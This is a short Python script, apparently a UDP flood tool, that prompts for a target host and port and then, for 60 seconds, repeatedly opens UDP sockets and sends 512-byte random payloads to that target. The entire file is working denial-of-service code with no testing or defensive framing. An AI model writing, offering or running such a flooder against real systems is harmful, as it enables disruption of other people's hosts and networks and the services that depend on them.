import time
import socket
import random
import sys

UDP_IP = str(input(" Host/Ip:"))
UDP_PORT = int(input(" Port:"))

packets_per_socket = 5
start_time = time.time()

data = random._urandom(512)
while (time.time() - start_time) < 60:
    try:
        data = random._urandom(512)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
        addr = (str(UDP_IP),int(UDP_PORT))
        for x in range(packets_per_socket):
            s.sendto(data,addr)
            print("UDP Sent!")
    except:
        s.close()
        print("[!] Error!")
